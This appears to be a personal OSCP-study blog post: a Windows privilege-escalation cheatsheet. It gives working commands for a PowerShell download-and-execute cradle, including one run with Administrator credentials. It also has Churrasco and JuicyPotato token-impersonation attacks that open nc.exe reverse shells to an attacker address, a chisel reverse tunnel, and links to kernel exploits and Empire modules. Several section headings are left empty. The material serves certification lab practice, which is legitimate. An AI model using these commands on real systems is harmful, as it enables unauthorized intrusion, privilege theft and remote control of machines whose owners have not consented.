---
title: Windows Privilege Escalation
author: linatl
category: "OSCP"
date: "2021-03-13 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Tricks to improve a crappy shell
```
rlwrap
> rlwrap -r nc -nvlp 443
```

###### Check Architecture of a PowerShell connection

~|32 bit folder|64 bit folder|
---|---|---
32-bit session | C:\Windows\system32\ | C:\Windows\sysNative
64-bit session | C:\Windows\sysWOW64\ | C:\Windows\system32

```
Check architecture of the host
> [system.environment]::Is64BitOperatingSystem

Check architecture of powershell environment:
> [Environment]::Is64BitProcess

alternative to check arch in ps environment:
> [IntPtr]::Size
The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process.

For example: If you get a shell trough a webserver running in a 32bit process but the host is 64bit, powershell will by default open a 32bit process.
This can be solved by specifically calling powershell with the following path:
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe

More info:
https://ss64.com/nt/syntax-64bit.html
```


/// To be tested:
###### Start Process with PowerShell
```
How to use powershell to pop a second shell
> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"


Starting a shell as Administrator (when the permissions are right)

First: make a variable of the password.
Because windows doesnt like it when you pass passwords in plain text to a command.
> $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)

Pop the shell:
> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
```


###### Token Kidnapping on Windows Server 2003 / 2008 with Churrasco

```
If you are Network Service or Local Service and SeImpersonatePrivilege is Enabled, this will probably work.

> git clone https://github.com/Re4son/Churrasco
after uploading the exe:

Execute Command
> churrasco.exe -d "whoami"
Using nc.exe to start a reverse shell connection
> churrasco.exe -d "c:\Users\username\Documents\nc.exe -e cmd.exe 192.168.1.1 443"
```

###### Potato attacks
```
If both SeChangeNotifyPrivilege and SeImpersonatePrivilege are enabled

Hot Potato
https://foxglovesecurity.com/2016/01/16/hot-potato/

Rotten Potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato

Juicy Potato
https://github.com/ohpe/juicy-potato
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
x86 variant:
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2

Example juicy potato:

List of CLSID's:
http://ohpe.it/juicy-potato/CLSID/

On attacker system:
> nc -nvlp 80
On target system:
First upload nc.exe & JuicyPotato.exe, and place it in current dir
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
Or using a different CLSID:
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
```

###### RunAs
###### Registry Tricks
###### AlwaysInstallElevated
###### Autorun
###### Service Permissions
###### Unquoted Path
###### DLL Hijacking


###### Port Forwarding
```

https://github.com/jpillora/chisel
1 upload chisel to the box

2 start chisel on kali
$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse

3 run chisel on the target
$ .\c.exe client 10.10.14.20:8000 R:8888:localhost:8888

4 see if the connection is made
port 8888 on kali should be listening now:
$ netstat -ntlp

5 do stuff from kali on address 127.0.0.1 port 8888
```


###### Schtasks
```
> schtasks /query /fo LIST /v
> tasklist /SVC
```


###### Windows (Kernel) Exploits
```
MS10-059 (SecWiki)
MS11-046 (SecWiki)
MS16-032 (Use the one from Empire)
MS15-051 (SecWiki)
```

###### Kernel Exploits ~ Resources
```
Seclists
https://github.com/SecWiki/windows-kernel-exploits

Empire
https://github.com/EmpireProject/Empire/tree/master/data/module_source
```
